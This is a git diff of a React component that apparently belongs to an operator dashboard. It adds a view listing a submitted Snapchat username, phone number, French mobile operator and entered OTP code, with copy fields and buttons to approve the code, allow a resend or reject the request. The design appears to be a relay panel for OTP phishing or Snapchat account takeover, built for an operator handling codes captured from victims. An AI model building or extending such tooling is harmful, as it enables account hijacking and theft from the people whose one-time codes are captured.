@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { motion } from "framer-motion";
-import { Send, Hash, Ban, Clock, X, Copy, Check } from "lucide-react";
+import { Send, Hash, Ban, Clock, X, Copy, Check, RefreshCw } from "lucide-react";
 import { base44 } from "@/api/base44Client";
 import { t } from "@/components/buyer/i18n";
 
@@ -40,6 +40,12 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
   const [sentLabel, setSentLabel] = useState("");
   const [isError, setIsError] = useState(false);
 
+  const verdictLabels = {
+    valid: lang === "fr" ? "Code validé ✓" : "Code approved ✓",
+    resend: lang === "fr" ? "Renvoi autorisé ✓" : "Resend allowed ✓",
+    wrong: t(lang, "wrong"),
+  };
+
   const runAction = async (action) => {
     setBusy(action);
     setResult("");
@@ -54,10 +60,11 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
         setIsError(true);
         setResult(res.data.error);
       } else {
-        const label = actions.find((a) => a.key === action)?.label || action;
+        const label = verdictLabels[action] || actions.find((a) => a.key === action)?.label || action;
         setSentLabel(label);
         setResult(lang === "fr" ? "Action envoyée ✓" : "Action sent ✓");
-        if (action === "wrong") setTimeout(() => onDone?.(), 1200);
+        if (action === "valid" || action === "wrong") setTimeout(() => onDone?.(), 1200);
+        if (action === "resend") setTimeout(() => onDone?.({ reloadOnly: true }), 800);
       }
     } catch (err) {
       setIsError(true);
@@ -103,6 +110,78 @@ export default function SubmissionActions({ sub, discord, lang, buyerId, onDone 
     Bouygues: "#e3f2fd",
     Orange: "#fff3e0",
   };
+
+  if (sub.entered_code) {
+    return (
+      <motion.div
+        initial={{ opacity: 0, y: 10 }}
+        animate={{ opacity: 1, y: 0 }}
+        className="bg-white rounded-2xl p-5 shadow-xl shadow-black/20 border border-slate-200"
+      >
+        <div className="flex items-center justify-between mb-4">
+          <span className="px-2.5 py-1 rounded-md text-[11px] font-bold text-slate-700" style={{ backgroundColor: "#f3f4f6" }}>
+            {lang === "fr" ? "OTP soumis" : "OTP submitted"}
+          </span>
+          <span className="px-2.5 py-1 rounded-full text-[11px] font-bold" style={{ backgroundColor: opBg[sub.operateur] || opBg.Bouygues, color: "#1565c0" }}>
+            {sub.operateur}
+          </span>
+        </div>
+
+        <div className="space-y-2.5 mb-4">
+          <CopyField label={lang === "fr" ? "Pseudo Snapchat" : "Snapchat user"} value={`@${sub.snapchat}`} bg="#f3f4f6" />
+          <CopyField label={lang === "fr" ? "Numéro de téléphone" : "Phone number"} value={formatFull(sub.telephone)} bg="#f0fdf4" />
+          <CopyField label={lang === "fr" ? "Opérateur" : "Operator"} value={sub.operateur} bg="#f0f9ff" />
+          <CopyField label={lang === "fr" ? "Code OTP" : "OTP code"} value={sub.entered_code} bg="#f5f3ff" />
+        </div>
+
+        <div className="space-y-2.5">
+          <button
+            onClick={() => runAction("valid")}
+            disabled={!!busy}
+            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold transition-opacity disabled:opacity-50"
+            style={{ backgroundColor: "#059669", color: "#fff" }}
+          >
+            {busy === "valid" ? <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <Check className="w-4 h-4" />}
+            {lang === "fr" ? "Approuver & vérifier" : "Approve OTP & verify"}
+          </button>
+          <button
+            onClick={() => runAction("resend")}
+            disabled={!!busy}
+            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold transition-opacity disabled:opacity-50"
+            style={{ backgroundColor: "#d97706", color: "#fff" }}
+          >
+            {busy === "resend" ? <span className="w-4 h-4 border-2 border-white/40 border-t-white rounded-full animate-spin" /> : <RefreshCw className="w-4 h-4" />}
+            {lang === "fr" ? "Code invalide — autoriser renvoi" : "Invalid OTP — allow resend"}
+          </button>
+          <button
+            onClick={() => runAction("wrong")}
+            disabled={!!busy}
+            className="w-full flex items-center justify-center gap-2 px-3 py-3.5 rounded-xl text-sm font-bold bg-transparent transition-colors disabled:opacity-50"
+            style={{ border: "1.5px solid #e11d48", color: "#e11d48" }}
+          >
+            {busy === "wrong" ? <span className="w-4 h-4 border-2 border-red-300 border-t-red-500 rounded-full animate-spin" /> : <X className="w-4 h-4" />}
+            {lang === "fr" ? "Rejeter la demande" : "Reject request"}
+          </button>
+        </div>
+
+        {result && (
+          <div
+            className="mt-4 rounded-xl px-4 py-4 text-center"
+            style={{ backgroundColor: isError ? "#fdecea" : "#e8f5e9", border: `1.5px solid ${isError ? "#e74c3c" : "#27ae60"}` }}
+          >
+            {sentLabel && (
+              <div className="text-base font-bold mb-1" style={{ color: isError ? "#c0392b" : "#1e7e34" }}>
+                {sentLabel}
+              </div>
+            )}
+            <div className="text-xl font-extrabold leading-tight" style={{ color: isError ? "#e74c3c" : "#27ae60" }}>
+              {result}
+            </div>
+          </div>
+        )}
+      </motion.div>
+    );
+  }
 
   return (
     <motion.div
